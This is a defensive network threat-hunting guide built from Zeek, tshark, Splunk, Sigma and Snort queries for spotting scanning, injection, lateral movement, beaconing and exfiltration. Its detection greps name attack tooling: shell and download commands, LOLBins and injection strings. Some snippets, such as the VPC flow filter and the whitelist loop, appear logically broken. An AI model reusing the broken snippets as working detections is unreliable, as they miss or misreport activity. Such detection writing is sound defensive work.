# Network Threat Hunting Comprehensive Field Guide

## Executive Summary & Context

**Mission**: Detect advanced persistent threats, insider threats, and sophisticated attacks through systematic network analysis
**Scope**: Enterprise network environments with mixed on-premises/cloud infrastructure
**Target Users**: SOC analysts, threat hunters, incident responders, security engineers

---

## Tool Arsenal & Core Capabilities

### Primary Investigation Tools
- **Wireshark/tshark**: Packet analysis and protocol dissection
- **Zeek/Bro**: Network security monitoring and logging
- **tcpdump**: Lightweight packet capture
- **nmap/masscan**: Network discovery and reconnaissance
- **NetworkMiner**: Network forensic analysis
- **Suricata/Snort**: IDS/IPS with threat detection rules
- **Rita**: Beacon detection and C2 analysis
- **JA3/JA4**: TLS/SSL fingerprinting
- **Splunk/ELK**: Log aggregation and correlation

---

## MITRE ATT&CK Mapped Network Hunting

### Reconnaissance (T1590-T1595)

**Network Discovery Detection**
```bash
# Detect port scanning (nmap, masscan)
## Zeek logs
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p proto duration | \
awk '$4=="tcp" && $5<1' | sort | uniq -c | sort -nr

## tcpdump approach
tcpdump -nr capture.pcap 'tcp[tcpflags] & tcp-syn != 0 and tcp[tcpflags] & tcp-ack == 0' | \
awk '{print $3}' | cut -d'.' -f1-4 | sort | uniq -c | sort -nr

# DNS enumeration detection
## Look for subdomain brute forcing
cat dns.log | zeek-cut query | grep -E "^[a-z0-9-]{1,20}\.(target\.com)$" | sort | uniq -c | sort -nr

## Rapid DNS queries from single host
cat dns.log | zeek-cut id.orig_h query | awk '{count[$1]++} END {for(ip in count) if(count[ip]>100) print ip, count[ip]}'
```

**OSINT Reconnaissance Indicators**
```bash
# Suspicious User-Agent strings
cat http.log | zeek-cut user_agent | grep -E "(curl|wget|python|scanner)" | sort | uniq -c | sort -nr

# Favicon hash collection (Shodan fingerprinting)
cat http.log | zeek-cut id.orig_h uri | grep "/favicon.ico" | cut -f1 | sort | uniq -c | sort -nr
```

### Initial Access (T1190, T1133, T1566)

**Web Application Attacks**
```bash
# SQL injection attempts
cat http.log | zeek-cut id.orig_h method uri | \
grep -iE "(union|select|insert|delete|update|drop|exec|script|javascript)" | \
awk '{print $1}' | sort | uniq -c | sort -nr

# Directory traversal
cat http.log | zeek-cut id.orig_h uri | grep -E "(\.\./|\.\.\\|%2e%2e%2f)" | \
awk '{print $1}' | sort | uniq -c | sort -nr

# Command injection patterns
cat http.log | zeek-cut id.orig_h uri | \
grep -iE "(cmd\.exe|/bin/sh|powershell|wget|curl)" | \
awk '{print $1}' | sort | uniq -c | sort -nr

# File upload attempts
cat http.log | zeek-cut id.orig_h method uri | \
grep -E "(POST.*\.(php|asp|jsp|exe))" | awk '{print $1}' | sort | uniq -c | sort -nr
```

**Email-Based Attacks (T1566)**
```bash
# Suspicious email attachments via SMTP
cat smtp.log | zeek-cut mailfrom rcptto subject | \
grep -iE "\.(exe|scr|bat|com|pif|zip|rar)" | head -20

# External email with suspicious links
cat http.log | zeek-cut id.orig_h referrer uri | \
grep -iE "(bit\.ly|tinyurl|t\.co|goo\.gl)" | awk '{print $1}' | sort | uniq -c | sort -nr
```

**VPN/Remote Access Abuse**
```bash
# Multiple VPN connections from same external IP
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service | \
grep -E "(1723|500|4500|1194)" | awk '{print $1}' | sort | uniq -c | sort -nr | head -10

# Impossible travel detection
cat conn.log | zeek-cut ts id.orig_h id.resp_h | \
awk 'BEGIN{OFS="\t"} {print strftime("%Y-%m-%d %H:%M:%S", $1), $2, $3}'
```

### Execution (T1059, T1204, T1053)

**Living Off The Land Binaries (LOLBins)**
```bash
# PowerShell execution indicators
cat http.log | zeek-cut id.orig_h user_agent uri | \
grep -iE "(powershell|cmd\.exe|wscript|cscript)" | awk '{print $1}' | sort | uniq -c | sort -nr

# Suspicious process names in HTTP traffic
cat http.log | zeek-cut id.orig_h uri | \
grep -iE "(rundll32|regsvr32|mshta|bitsadmin)" | awk '{print $1}' | sort | uniq -c | sort -nr
```

### Persistence (T1053, T1543, T1547)

**Scheduled Task Creation**
```bash
# SMB/RPC calls for task scheduling (Windows)
cat dce_rpc.log | zeek-cut id.orig_h endpoint operation | \
grep -iE "(atsvc|taskscheduler)" | awk '{print $1}' | sort | uniq -c | sort -nr

# Suspicious file drops to system directories
cat files.log | zeek-cut tx_hosts rx_hosts filename | \
grep -iE "(system32|syswow64|startup)" | head -20
```

### Defense Evasion (T1027, T1070, T1055)

**Process Injection Detection**
```bash
# Unusual process network activity
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service duration orig_bytes | \
awk '$6>1000000' | sort -k6 -nr | head -20

# DLL injection indicators via SMB
cat smb_files.log | zeek-cut id.orig_h name | \
grep -iE "\.dll$" | awk '{print $1}' | sort | uniq -c | sort -nr
```

**Log Evasion & Clearing**
```bash
# Windows Event Log clearing (via network)
cat dce_rpc.log | zeek-cut id.orig_h endpoint operation | \
grep -iE "(eventlog|wevtsvc)" | awk '{print $1}' | sort | uniq -c | sort -nr

# Suspicious time gaps in logging
cat conn.log | zeek-cut ts | \
awk '{
    if(prev) {
        gap = $1 - prev;
        if(gap > 300) print "Gap of " gap " seconds at " strftime("%Y-%m-%d %H:%M:%S", $1);
    }
    prev = $1;
}'
```

**Obfuscation Detection**
```bash
# Base64 encoded content in HTTP
cat http.log | zeek-cut id.orig_h uri | \
grep -E "([A-Za-z0-9+/]{20,}={0,2})" | awk '{print $1}' | sort | uniq -c | sort -nr

# High entropy strings (potential encryption/encoding)
cat http.log | zeek-cut uri | \
awk '{for(i=1;i<=length($1);i++) chars[substr($1,i,1)]++; entropy=0; for(c in chars) {p=chars[c]/length($1); entropy-=p*log(p)/log(2)} if(entropy>4.5) print entropy, $1; delete chars}'
```

### Credential Access (T1003, T1110, T1558)

**Brute Force Detection**
```bash
# SSH brute force
cat ssh.log | zeek-cut id.orig_h auth_success | \
awk '$2=="F" {count[$1]++} END {for(ip in count) if(count[ip]>10) print ip, count[ip]}' | sort -k2 -nr

# SMB authentication failures
cat ntlm.log | zeek-cut id.orig_h success | \
awk '$2=="F" {count[$1]++} END {for(ip in count) if(count[ip]>20) print ip, count[ip]}' | sort -k2 -nr

# Kerberos authentication anomalies
cat kerberos.log | zeek-cut id.orig_h success error_msg | \
awk '$2=="F" {print $1, $3}' | sort | uniq -c | sort -nr
```

**Password Spraying**
```bash
# Multiple failed logins across different accounts from same source
cat ntlm.log | zeek-cut id.orig_h username success | \
awk '$3=="F" {users[$1][$2]++; total[$1]++} END {for(ip in total) if(length(users[ip])>10 && total[ip]>50) print ip, length(users[ip]), total[ip]}'
```

### Discovery (T1046, T1083, T1135)

**Network Discovery**
```bash
# ARP scanning detection
cat arp.log | zeek-cut src_hw_addr src_ip dst_ip | \
awk '{count[$1]++; ips[$1][$3]++} END {for(mac in count) if(count[mac]>100) {print mac, count[mac], "unique_targets:", length(ips[mac])}}'

# ICMP sweep detection
cat icmp.log | zeek-cut id.orig_h id.resp_h type code | \
awk '$3==8 && $4==0 {count[$1]++; targets[$1][$2]++} END {for(ip in count) if(count[ip]>20) print ip, "pings:", count[ip], "targets:", length(targets[ip])}'
```

**SMB Share Enumeration**
```bash
# Rapid SMB share access attempts
cat smb_mapping.log | zeek-cut id.orig_h path | \
awk '{count[$1]++; shares[$1][$2]++} END {for(ip in count) if(length(shares[ip])>5) print ip, "shares_accessed:", length(shares[ip])}'
```

### Lateral Movement (T1021, T1570, T1210)

**RDP Lateral Movement**
```bash
# RDP connections from internal hosts
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service duration | \
awk '$3==3389 && $4=="rdp" {print $1, $2, $5}' | \
awk '$3>300' | sort | uniq -c | sort -nr

# Multiple RDP sessions from single source
cat rdp.log | zeek-cut id.orig_h id.resp_h | \
awk '{count[$1]++; targets[$1][$2]++} END {for(ip in count) if(length(targets[ip])>3) print ip, "rdp_targets:", length(targets[ip])}'
```

**SMB Lateral Movement**
```bash
# Admin share access
cat smb_files.log | zeek-cut id.orig_h id.resp_h name | \
grep -E "(ADMIN\$|C\$|IPC\$)" | awk '{print $1, $2}' | sort | uniq -c | sort -nr

# PSExec-style service installation
cat smb_files.log | zeek-cut id.orig_h name | \
grep -iE "\.exe$" | grep -E "(system32|syswow64)" | awk '{print $1}' | sort | uniq -c | sort -nr
```

**WMI Lateral Movement**
```bash
# WMI process creation via DCOM
cat dce_rpc.log | zeek-cut id.orig_h id.resp_h endpoint operation | \
grep -iE "(IWbemServices|IWbemObjectSink)" | awk '{print $1, $2}' | sort | uniq -c | sort -nr
```

### Command & Control (T1071, T1573, T1572)

**HTTP/HTTPS C2 Detection**
```bash
# Beaconing detection using Rita-style analysis
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes resp_bytes | \
awk '$4<10 && $5<1000 && $6<1000 {
    key=$1":"$2":"$3;
    count[key]++;
    total_duration[key]+=$4;
    if(count[key]>10) {
        avg_duration = total_duration[key]/count[key];
        if(avg_duration < 5) print key, count[key], avg_duration;
    }
}'

# Suspicious User-Agent patterns
cat http.log | zeek-cut id.orig_h user_agent | \
grep -vE "(Mozilla|Chrome|Safari|Edge|Firefox)" | \
awk '{count[$2]++; hosts[$2][$1]++} END {for(ua in count) if(count[ua]>50) print ua, count[ua], length(hosts[ua])}'

# JA3 SSL fingerprinting for C2
cat ssl.log | zeek-cut id.orig_h server_name ja3 | \
awk '{count[$3]++; hosts[$3][$1]++} END {for(ja3 in count) if(length(hosts[ja3])>10 && count[ja3]<100) print ja3, count[ja3], length(hosts[ja3])}'
```

**DNS Tunneling Detection**
```bash
# Excessive DNS queries per host
cat dns.log | zeek-cut id.orig_h query | \
awk '{count[$1]++} END {for(ip in count) if(count[ip]>1000) print ip, count[ip]}' | sort -k2 -nr

# Suspicious TXT record queries
cat dns.log | zeek-cut id.orig_h query qtype answers | \
awk '$3=="TXT" && length($4)>100 {print $1, $2, length($4)}'

# Long subdomain names (potential data exfiltration)
cat dns.log | zeek-cut query | \
awk -F'.' '{if(length($1)>20) print $0, length($1)}' | sort -k2 -nr | head -20

# High entropy domain names
cat dns.log | zeek-cut query | \
awk '{
    domain=$1; gsub(/[^a-zA-Z0-9]/, "", domain);
    len=length(domain); if(len<5) next;
    delete chars; for(i=1;i<=len;i++) chars[substr(domain,i,1)]++;
    entropy=0; for(c in chars) {p=chars[c]/len; entropy-=p*log(p)/log(2)}
    if(entropy>3.5) print $1, entropy
}' | sort -k2 -nr | head -20
```

**ICMP Tunneling**
```bash
# Large ICMP packets (potential tunneling)
cat icmp.log | zeek-cut id.orig_h id.resp_h type payload_len | \
awk '$4>64 {count[$1]++; total[$1]+=$4} END {for(ip in count) if(count[ip]>20) print ip, count[ip], total[ip]/count[ip]}'

# ICMP with unusual types
cat icmp.log | zeek-cut id.orig_h type code | \
awk '$2!=8 && $2!=0 {count[$1":"$2":"$3]++} END {for(combo in count) if(count[combo]>10) print combo, count[combo]}'
```

### Exfiltration (T1041, T1567, T1020)

**Data Upload Detection**
```bash
# Large HTTP uploads
cat http.log | zeek-cut id.orig_h method uri request_body_len | \
awk '$2=="POST" && $4>1000000 {print $1, $3, $4}' | sort -k3 -nr

# FTP data transfers
cat ftp.log | zeek-cut id.orig_h command arg | \
awk '$2=="STOR" {print $1, $3}' | sort | uniq -c | sort -nr

# Cloud storage abuse
cat http.log | zeek-cut id.orig_h host uri method request_body_len | \
grep -iE "(dropbox|drive\.google|onedrive|mega\.)" | \
awk '$4=="POST" && $5>100000 {print $1, $2, $5}'
```

**Email Exfiltration**
```bash
# Large email attachments
cat smtp.log | zeek-cut id.orig_h mailfrom rcptto subject | \
grep -vE "@(company\.com|domain\.com)" | head -20

# Multiple recipients (potential data spreading)
cat smtp.log | zeek-cut id.orig_h mailfrom | \
awk '{count[$1]++} END {for(ip in count) if(count[ip]>50) print ip, count[ip]}' | sort -k2 -nr
```

---

## Advanced Analysis Techniques

### Statistical Analysis & Baselines

**Connection Pattern Analysis**
```bash
# Generate connection baselines
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p service duration orig_bytes resp_bytes | \
awk '{
    key=$1":"$2":"$3;
    count[key]++;
    duration_sum[key]+=$5;
    orig_sum[key]+=$6;
    resp_sum[key]+=$7;
} END {
    for(conn in count) {
        avg_duration = duration_sum[conn]/count[conn];
        avg_orig = orig_sum[conn]/count[conn];
        avg_resp = resp_sum[conn]/count[conn];
        if(count[conn]>10) print conn, count[conn], avg_duration, avg_orig, avg_resp;
    }
}' | sort -k2 -nr > connection_baselines.txt

# Detect deviations from baseline
cat conn.log | zeek-cut id.orig_h id.resp_h id.resp_p duration orig_bytes | \
awk 'BEGIN{while((getline < "connection_baselines.txt")>0) baseline[$1]=$4} 
{key=$1":"$2":"$3; if(key in baseline && $4 > baseline[key]*3) print "ANOMALY:", $0}'
```

**Time Series Analysis**
```bash
# Detect beaconing with time intervals
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p | \
awk '{
    key=$2":"$3":"$4;
    if(prev_time[key]) {
        interval = $1 - prev_time[key];
        intervals[key][interval]++;
        count[key]++;
    }
    prev_time[key] = $1;
} END {
    for(conn in count) {
        if(count[conn] > 10) {
            # Check for regular intervals (beaconing)
            for(interval in intervals[conn]) {
                if(intervals[conn][interval] > count[conn]*0.7) {
                    print "BEACONING:", conn, "interval:", interval, "occurrences:", intervals[conn][interval];
                }
            }
        }
    }
}'
```

### Machine Learning Approaches

**Feature Extraction for ML Models**
```bash
# Extract features for anomaly detection
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p proto service duration orig_bytes resp_bytes | \
awk '{
    # Extract time features
    hour = strftime("%H", $1);
    day_of_week = strftime("%w", $1);
    
    # Extract network features
    bytes_ratio = ($8 > 0 && $9 > 0) ? $8/$9 : 0;
    total_bytes = $8 + $9;
    
    print $1, $2, $3, $4, $5, $6, $7, $8, $9, hour, day_of_week, bytes_ratio, total_bytes;
}' > features_for_ml.csv
```

### Threat Intelligence Integration

**IOC Enrichment**
```bash
# Check IPs against threat feeds
cat conn.log | zeek-cut id.resp_h | sort | uniq > external_ips.txt
while read ip; do
    # Check against local threat feed
    if grep -q "$ip" /path/to/threat_feed.txt; then
        echo "THREAT: $ip found in threat feed"
        # Get all connections to this IP
        cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service | grep "$ip"
    fi
done < external_ips.txt

# Domain reputation checking
cat dns.log | zeek-cut query | sort | uniq > domains.txt
while read domain; do
    # Check against domain blacklist
    if grep -q "$domain" /path/to/malicious_domains.txt; then
        echo "MALICIOUS DOMAIN: $domain"
        # Find hosts that queried this domain
        cat dns.log | zeek-cut id.orig_h query | grep "$domain" | cut -f1 | sort | uniq
    fi
done < domains.txt
```

---

## Network Forensics Workflows

### Incident Response Workflow

**Phase 1: Initial Triage**
```bash
# Quick overview of traffic
echo "=== Traffic Overview ==="
cat conn.log | zeek-cut proto service | sort | uniq -c | sort -nr | head -20

echo "=== Top Talkers ==="
cat conn.log | zeek-cut id.orig_h orig_bytes | \
awk '{sum[$1]+=$2} END {for(ip in sum) print ip, sum[ip]}' | sort -k2 -nr | head -10

echo "=== External Connections ==="
cat conn.log | zeek-cut id.orig_h id.resp_h | \
awk '$2 !~ /^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)/ {print}' | \
sort | uniq -c | sort -nr | head -20
```

**Phase 2: Timeline Reconstruction**
```bash
# Create detailed timeline
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service duration orig_bytes resp_bytes | \
sort -k1 -n | \
awk '{print strftime("%Y-%m-%d %H:%M:%S", $1), $2, "->", $3":"$4, $5, $6"s", $7"/"$8" bytes"}' \
> network_timeline.txt

# Focus on specific time window
start_time="2024-01-15 14:00:00"
end_time="2024-01-15 16:00:00"
start_epoch=$(date -d "$start_time" +%s)
end_epoch=$(date -d "$end_time" +%s)

cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service | \
awk -v start=$start_epoch -v end=$end_epoch '$1>=start && $1<=end {print}' | \
sort -k1 -n > incident_window.txt
```

**Phase 3: Lateral Movement Tracking**
```bash
# Track movement from compromised host
compromised_host="192.168.1.100"

echo "=== Outbound connections from compromised host ==="
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service | \
awk -v host=$compromised_host '$2==host {print strftime("%Y-%m-%d %H:%M:%S", $1), $3":"$4, $5}' | \
sort

echo "=== Authentication attempts ==="
cat ntlm.log ssh.log 2>/dev/null | zeek-cut id.orig_h id.resp_h username success | \
awk -v host=$compromised_host '$1==host {print}' | sort

echo "=== File transfers ==="
cat files.log | zeek-cut tx_hosts rx_hosts filename mime_type | \
awk -v host=$compromised_host '$1~host || $2~host {print}' | head -20
```

### Memory Analysis Integration

**Network Artifacts from Memory**
```bash
# Extract network connections from memory dump (using Volatility)
volatility -f memory.dump --profile=Win10x64 netscan > netscan_output.txt
volatility -f memory.dump --profile=Win10x64 netstat > netstat_output.txt

# Correlate with network logs
awk '{print $3}' netscan_output.txt | grep -E "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort | uniq > memory_ips.txt
while read ip; do
    echo "=== Connections to $ip ==="
    cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service | grep "$ip" | head -5
done < memory_ips.txt
```

---

## Tool-Specific Advanced Usage

### Wireshark/tshark Advanced Techniques

**Custom Dissectors & Scripts**
```bash
# Extract certificates for analysis
tshark -r capture.pcap -Y "ssl.handshake.certificate" -T fields \
-e ip.src -e ip.dst -e x509ce.dNSName -e x509ce.issuer > certificates.txt

# HTTP object extraction
tshark -r capture.pcap --export-objects http,extracted_objects/

# Custom Lua script for packet analysis
tshark -r capture.pcap -X lua_script:custom_analysis.lua
```

**Statistical Analysis**
```bash
# Protocol distribution
tshark -r capture.pcap -q -z io,phs

# Conversation analysis
tshark -r capture.pcap -q -z conv,tcp -z conv,udp

# HTTP statistics
tshark -r capture.pcap -q -z http,stat -z http_req,tree
```

### Zeek Advanced Configurations

**Custom Scripts for Threat Hunting**
```bash
# Custom Zeek script for beaconing detection
cat > beacon_detection.zeek << 'EOF'
@load base/protocols/conn

module BeaconDetection;

export {
    redef enum Log::ID += { LOG };
    
    type Info: record {
        ts: time &log;
        orig_h: addr &log;
        resp_h: addr &log;
        resp_p: port &log;
        interval: interval &log;
        count: count &log;
    };
    
    global beacon_connections: table[addr,addr,port] of vector of time;
}

event connection_established(c: connection) {
    local key = [c$id$orig_h, c$id$resp_h, c$id$resp_p];
    
    if (key !in beacon_connections)
        beacon_connections[key] = vector();
    
    beacon_connections[key][|beacon_connections[key]|] = network_time();
    
    # Check for beaconing pattern
    if (|beacon_connections[key]| >= 5) {
        local intervals: vector of interval;
        for (i in beacon_connections[key]) {
            if (i > 0) {
                intervals[|intervals|] = beacon_connections[key][i] - beacon_connections[key][i-1];
            }
        }
        
        # Simple beacon detection logic
        local avg_interval: interval = 0;
        for (i in intervals) avg_interval += intervals[i];
        avg_interval = avg_interval / |intervals|;
        
        if (avg_interval > 30sec && avg_interval < 600sec) {
            Log::write(LOG, [$ts=network_time(), $orig_h=c$id$orig_h, 
                           $resp_h=c$id$resp_h, $resp_p=c$id$resp_p,
                           $interval=avg_interval, $count=|beacon_connections[key]|]);
        }
    }
}
EOF

# Run with custom script
zeek -r capture.pcap beacon_detection.zeek
```

### NetworkMiner Automation

**Automated Artifact Extraction**
```bash
# Extract files and credentials
networkminer --nogui --pcap capture.pcap --output /tmp/networkminer/

# Parse extracted data
ls /tmp/networkminer/AssembledFiles/ | head -20
cat /tmp/networkminer/Credentials.csv | head -10
cat /tmp/networkminer/Hosts.csv | head -20
```

---

## Cloud Network Monitoring

### AWS VPC Flow Logs Analysis

**Flow Log Processing**
```bash
# Parse VPC Flow Logs
cat vpc_flow_logs.txt | awk '$13=="ACCEPT" && $14=="REJECT" {print}' | head -20

# Top rejected connections
cat vpc_flow_logs.txt | awk '$14=="REJECT" {print $4, $5, $6}' | sort | uniq -c | sort -nr | head -20

# Data transfer analysis
cat vpc_flow_logs.txt | awk '$14=="ACCEPT" {sum+=$10} END {print "Total bytes:", sum}'
```

### Azure NSG Flow Logs

**NSG Log Analysis**
```bash
# Parse NSG Flow Logs JSON
cat nsg_flow_logs.json | jq -r '.records[] | select(.properties.flows[].rule == "UserRule_DenyAll") | .properties.flows[].flows[]'

# Extract denied connections
cat nsg_flow_logs.json | jq -r '.records[].properties.flows[] | select(.rule | contains("Deny")) | .flows[]'
```

---

## Performance Optimization & Scaling

### High-Volume Network Analysis

**Stream Processing**
```bash
# Real-time analysis pipeline
mkfifo network_pipe
tcpdump -i eth0 -w - | tee network_pipe | zeek -r - &
cat network_pipe | python3 real_time_analyzer.py &

# Parallel processing for large captures
split -b 100M capture.pcap chunk_
for chunk in chunk_*; do
    (zeek -r "$chunk" && echo "Processed $chunk") &
done
wait
```

**Memory Management**
```bash
# Process large files in chunks
capinfos capture.pcap  # Get file info
editcap -c 10000 capture.pcap split_capture.pcap  # Split by packet count
editcap -i 300 capture.pcap time_split.pcap      # Split by time interval
```

### Distributed Analysis

**Multi-Node Processing**
```bash
# Distribute analysis across multiple hosts
hosts=("analyst1" "analyst2" "analyst3")
files=(chunk_aa chunk_ab chunk_ac)

for i in "${!files[@]}"; do
    scp "${files[i]}" "${hosts[i]}:/tmp/"
    ssh "${hosts[i]}" "zeek -r /tmp/${files[i]} && scp *.log analyst-master:/shared/results/${files[i]}_" &
done
wait

# Aggregate results
cat /shared/results/*_conn.log > combined_conn.log
cat /shared/results/*_dns.log > combined_dns.log
```

---

## Red Flags & Indicator Interpretation

### High-Priority Indicators

**Immediate Investigation Required**
```bash
# Multiple authentication failures followed by success
cat ssh.log ntlm.log 2>/dev/null | zeek-cut ts id.orig_h auth_success username | \
sort -k1 | awk '
{
    if($3=="F") failures[$2]++;
    else if($3=="T" && failures[$2]>5) {
        print "ALERT: Successful login after", failures[$2], "failures from", $2, "user:", $4, "at", strftime("%Y-%m-%d %H:%M:%S", $1);
        delete failures[$2];
    }
}'

# Data exfiltration patterns
cat conn.log | zeek-cut id.orig_h id.resp_h orig_bytes duration | \
awk '$3>10000000 && $4>300 {
    rate = $3/$4;
    if(rate > 100000) print "HIGH BANDWIDTH:", $1, "->", $2, $3/1000000 "MB in", $4 "seconds", rate/1000 "KB/s";
}'

# C2 beaconing with jitter detection
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p duration | \
awk '{
    key=$2":"$3":"$4;
    if(prev_time[key]) {
        interval = $1 - prev_time[key];
        intervals[key][++count[key]] = interval;
        sum[key] += interval;
        
        if(count[key] >= 10) {
            avg = sum[key]/count[key];
            variance = 0;
            for(i=1; i<=count[key]; i++) {
                variance += (intervals[key][i] - avg)^2;
            }
            variance = variance/count[key];
            stddev = sqrt(variance);
            jitter = stddev/avg;
            
            # Low jitter indicates potential beaconing
            if(jitter < 0.3 && avg > 30 && avg < 3600) {
                print "BEACONING DETECTED:", key, "avg_interval:", avg, "jitter:", jitter, "connections:", count[key];
            }
        }
    }
    prev_time[key] = $1;
}'
```

### False Positive Mitigation

**Common False Positives & Filters**
```bash
# Exclude legitimate automated tools
legitimate_uas="(Windows-Update|Microsoft|Apple|Google|UpdateService)"

cat http.log | zeek-cut id.orig_h user_agent uri | \
grep -vE "$legitimate_uas" | \
grep -iE "(scan|bot|crawler)" | head -20

# Filter out CDN and cloud provider ranges
# Create whitelist of known good ranges
cat > legitimate_ranges.txt << 'EOF'
23.0.0.0/8      # Akamai
104.16.0.0/12   # Cloudflare
52.0.0.0/8      # AWS
13.0.0.0/8      # Microsoft Azure
EOF

# Apply whitelist filtering
while read range; do
    range_clean=$(echo "$range" | awk '{print $1}')
    cat conn.log | zeek-cut id.resp_h | \
    awk -v range="$range_clean" '$1 !~ /^(range)/ {print}' > filtered_external.tmp
    mv filtered_external.tmp conn_filtered.log
done < legitimate_ranges.txt
```

**Baseline Deviation Detection**
```bash
# Create 30-day baseline
find /logs -name "conn*.log" -mtime -30 | \
xargs cat | zeek-cut id.orig_h id.resp_h id.resp_p | \
sort | uniq -c | sort -nr > 30day_baseline.txt

# Compare current day against baseline
cat today_conn.log | zeek-cut id.orig_h id.resp_h id.resp_p | \
sort | uniq -c | sort -nr > today_connections.txt

# Find new connections not in baseline
comm -23 <(awk '{print $2,$3,$4}' today_connections.txt | sort) \
         <(awk '{print $2,$3,$4}' 30day_baseline.txt | sort) \
         > new_connections.txt

echo "=== NEW CONNECTIONS NOT SEEN IN 30 DAYS ==="
head -20 new_connections.txt
```

---

## Automation & Orchestration

### SOAR Integration

**Splunk Integration**
```bash
# Export logs for Splunk ingestion
cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p proto service duration orig_bytes resp_bytes | \
awk '{print strftime("%Y-%m-%d %H:%M:%S", $1), "src_ip="$2, "dest_ip="$3, "dest_port="$4, "protocol="$5, "service="$6, "duration="$7, "orig_bytes="$8, "resp_bytes="$9}' \
> splunk_format.log

# Create Splunk search for threat hunting
cat > splunk_searches.txt << 'EOF'
# Beaconing detection
index=network | eval interval=_time-lag(_time) | stats avg(interval) as avg_int, stdev(interval) as std_int, count by src_ip, dest_ip | where count>20 AND avg_int>30 AND avg_int<3600 AND (std_int/avg_int)<0.3

# Data exfiltration
index=network | stats sum(orig_bytes) as total_out by src_ip | where total_out>1000000000 | sort -total_out

# Failed then successful authentication
index=auth earliest=-1h | transaction src_ip maxspan=1h | where match(_raw, "failed.*success")
EOF
```

**ELK Stack Integration**
```bash
# Logstash configuration for Zeek logs
cat > logstash_zeek.conf << 'EOF'
input {
  file {
    path => "/opt/zeek/logs/current/*.log"
    start_position => "beginning"
    exclude => "*.gz"
  }
}

filter {
  if [path] =~ "conn" {
    csv {
      separator => "	"
      columns => ["ts","uid","id.orig_h","id.orig_p","id.resp_h","id.resp_p","proto","service","duration","orig_bytes","resp_bytes","conn_state","local_orig","local_resp","missed_bytes","history","orig_pkts","orig_ip_bytes","resp_pkts","resp_ip_bytes","tunnel_parents"]
    }
    
    date {
      match => [ "ts", "UNIX" ]
    }
    
    mutate {
      convert => { "duration" => "float" }
      convert => { "orig_bytes" => "integer" }
      convert => { "resp_bytes" => "integer" }
    }
  }
}

output {
  elasticsearch {
    hosts => ["localhost:9200"]
    index => "zeek-logs-%{+YYYY.MM.dd}"
  }
}
EOF

# Elasticsearch queries for threat hunting
curl -X GET "localhost:9200/zeek-logs-*/_search" -H 'Content-Type: application/json' -d'
{
  "query": {
    "bool": {
      "must": [
        {"range": {"orig_bytes": {"gte": 1000000}}},
        {"range": {"duration": {"gte": 300}}}
      ]
    }
  },
  "aggs": {
    "top_uploaders": {
      "terms": {"field": "id.orig_h", "size": 10}
    }
  }
}'
```

### Threat Intelligence Automation

**Automated IOC Enrichment**
```bash
#!/bin/bash
# automated_ioc_enrichment.sh

# Extract unique IPs from logs
cat conn.log | zeek-cut id.resp_h | grep -vE "^(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.)" | sort | uniq > external_ips.txt

# Function to check IP reputation
check_ip_reputation() {
    local ip=$1
    
    # VirusTotal API check (requires API key)
    if [ -n "$VT_API_KEY" ]; then
        vt_result=$(curl -s "https://www.virustotal.com/vtapi/v2/ip-address/report?apikey=$VT_API_KEY&ip=$ip" | jq -r '.positives')
        if [ "$vt_result" != "null" ] && [ "$vt_result" -gt 0 ]; then
            echo "MALICIOUS: $ip (VT positives: $vt_result)"
            return 1
        fi
    fi
    
    # AbuseIPDB check (requires API key)
    if [ -n "$ABUSEIPDB_API_KEY" ]; then
        abuse_result=$(curl -s -H "Key: $ABUSEIPDB_API_KEY" "https://api.abuseipdb.com/api/v2/check?ipAddress=$ip&maxAgeInDays=90" | jq -r '.data.abuseConfidencePercentage')
        if [ "$abuse_result" != "null" ] && [ "$abuse_result" -gt 50 ]; then
            echo "SUSPICIOUS: $ip (AbuseIPDB confidence: $abuse_result%)"
            return 1
        fi
    fi
    
    # Local threat feed check
    if grep -q "$ip" /opt/threat_feeds/malicious_ips.txt 2>/dev/null; then
        echo "KNOWN_MALICIOUS: $ip (local feed)"
        return 1
    fi
    
    return 0
}

# Process IPs and generate alerts
while read ip; do
    if ! check_ip_reputation "$ip"; then
        # Generate detailed alert
        echo "=== THREAT DETECTED: $ip ==="
        echo "Connections:"
        cat conn.log | zeek-cut ts id.orig_h id.resp_h id.resp_p service duration | \
        grep "$ip" | head -10
        echo "DNS queries:"
        cat dns.log | zeek-cut ts id.orig_h query answers | \
        grep "$ip" | head -5
        echo ""
    fi
done < external_ips.txt
```

### Custom Detection Rules

**Sigma Rule Integration**
```yaml
# Custom Sigma rule for network beaconing
title: Network Beaconing Detected
description: Detects potential C2 beaconing based on regular connection intervals
status: experimental
logsource:
    product: zeek
    service: conn
detection:
    selection:
        - orig_bytes: '<1000'
        - resp_bytes: '<1000'
        - duration: '<10'
    condition: selection and count() > 20
fields:
    - id.orig_h
    - id.resp_h
    - id.resp_p
falsepositives:
    - Legitimate automated tools
    - Network monitoring systems
level: medium
```

**Snort Rules for Network Monitoring**
```bash
# Custom Snort rules for threat hunting
cat > custom_threat_hunting.rules << 'EOF'
# DNS tunneling detection
alert udp any any -> any 53 (msg:"Possible DNS Tunneling - Long Query"; content:"|01 00 00 01|"; content:"|00 00 10 00 01|"; distance:4; within:500; dsize:>100; sid:1000001; rev:1;)

# Beaconing detection
alert tcp any any -> any any (msg:"Possible HTTP Beaconing"; content:"GET"; http_method; content:"User-Agent|3a| "; http_header; pcre:"/User-Agent\:\s[A-Za-z0-9+\/]{20,}/H"; threshold:type both, track by_src, count 10, seconds 3600; sid:1000002; rev:1;)

# Large data transfer
